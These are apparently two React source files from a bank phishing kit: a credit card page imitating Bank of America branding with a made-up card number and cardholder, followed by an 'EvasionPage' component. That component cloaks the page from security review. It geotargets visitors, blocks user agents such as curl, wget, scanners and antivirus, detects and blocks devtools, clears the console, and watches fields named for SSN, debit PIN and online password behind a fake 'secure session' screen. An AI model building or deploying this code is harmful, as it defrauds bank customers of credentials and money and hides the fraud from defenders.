import DashboardLayout from "@/components/DashboardLayout";
import { CreditCard as CardIcon, Lock, Eye, EyeOff } from "lucide-react";
import { useState } from "react";
import { formatCurrency } from "@/data/accountData";
import { Button } from "@/components/ui/button";

const CreditCards = () => {
  const [showNumber, setShowNumber] = useState(false);

  const card = {
    name: "BankAmericard Cash Rewards™",
    number: "4532 •••• •••• 8847",
    fullNumber: "4532 7891 2345 8847",
    expiry: "09/28",
    balance: 3420.56,
    limit: 50000,
    available: 46579.44,
    rewards: 24850,
    apr: "16.99%",
    minPayment: 85.00,
    dueDate: "03/05/2026",
  };

  const recentCharges = [
    { date: "02/18/2026", desc: "Delta Airlines", amount: 1250.00 },
    { date: "02/16/2026", desc: "The Ritz-Carlton", amount: 890.00 },
    { date: "02/14/2026", desc: "Apple Store", amount: 999.00 },
    { date: "02/12/2026", desc: "Nordstrom", amount: 245.56 },
    { date: "02/10/2026", desc: "Whole Foods", amount: 36.00 },
  ];

  return (
    <DashboardLayout>
      <div className="max-w-3xl mx-auto space-y-6">
        <h1 className="text-2xl font-semibold text-gray-900">Credit Cards</h1>

        {/* Card visual - BankAmericard Cash Rewards style (red/blue diagonal stripes) */}
        <div className="relative rounded-2xl overflow-hidden shadow-lg aspect-[1.586/1] max-h-48 bg-gradient-to-br from-gray-700 via-gray-600 to-gray-700">
          {/* Diagonal stripes - Bank of America card style */}
          <div className="absolute inset-0 opacity-90">
            <div className="absolute inset-0 bg-gradient-to-br from-[#E31837] via-[#012169] to-[#E31837]" />
            <div className="absolute inset-0" style={{
              backgroundImage: `repeating-linear-gradient(
                135deg,
                transparent,
                transparent 8px,
                rgba(255,255,255,0.03) 8px,
                rgba(255,255,255,0.03) 16px
              )`,
            }} />
          </div>
          <div className="relative p-6 h-full flex flex-col justify-between text-white">
            <div className="flex items-center justify-between">
              <span className="text-sm font-medium text-white/90">{card.name}</span>
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold tracking-wider">VISA</span>
                <CardIcon className="h-6 w-6 text-white/80" />
              </div>
            </div>
            <div>
              <div className="flex items-center gap-2 mb-4">
                <p className="text-lg tracking-[0.2em] font-mono">
                  {showNumber ? card.fullNumber : card.number}
                </p>
                <button
                  onClick={() => setShowNumber(!showNumber)}
                  className="text-white/80 hover:text-white"
                >
                  {showNumber ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
              <div className="flex items-center gap-6">
                <div>
                  <p className="text-[10px] text-white/60 uppercase">Expires</p>
                  <p className="text-sm font-medium">{card.expiry}</p>
                </div>
                <div>
                  <p className="text-[10px] text-white/60 uppercase">Cardholder</p>
                  <p className="text-sm font-medium">JACK L WHITE</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        {/* Placeholder: Add your card image at /public/card-rewards.png for a photo-realistic card */}
        <p className="text-xs text-gray-500 text-center">
          Tip: Add <code className="bg-gray-100 px-1 rounded">/public/card-rewards.png</code> for a custom card image
        </p>

        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[
            { label: "Current Balance", value: formatCurrency(card.balance) },
            { label: "Available Credit", value: formatCurrency(card.available) },
            { label: "Reward Points", value: card.rewards.toLocaleString() },
            { label: "Min Payment Due", value: formatCurrency(card.minPayment) },
          ].map(({ label, value }) => (
            <div key={label} className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
              <p className="text-xs text-gray-500 mb-1">{label}</p>
              <p className="text-lg font-semibold text-gray-900">{value}</p>
            </div>
          ))}
        </div>

        <div className="flex flex-wrap gap-3">
          <Button className="bg-[#E31837] hover:bg-[#c4162f] text-white">Make a Payment</Button>
          <Button variant="outline" className="border-[#012169] text-[#012169] hover:bg-[#012169] hover:text-white">
            Redeem Rewards
          </Button>
          <Button variant="outline" className="border-gray-300">
            <Lock className="h-4 w-4 mr-1" /> Lock Card
          </Button>
        </div>

        {/* Recent charges */}
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          <div className="px-5 py-4 border-b border-gray-200 bg-gray-50">
            <h2 className="font-semibold text-gray-900">Recent Charges</h2>
          </div>
          <div className="divide-y divide-gray-200">
            {recentCharges.map((c, i) => (
              <div key={i} className="flex items-center justify-between px-5 py-3.5 hover:bg-gray-50">
                <div>
                  <p className="text-sm font-medium text-gray-900">{c.desc}</p>
                  <p className="text-xs text-gray-500">{c.date}</p>
                </div>
                <span className="text-sm font-semibold text-gray-900">{formatCurrency(c.amount)}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
};

export default CreditCards;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

  
}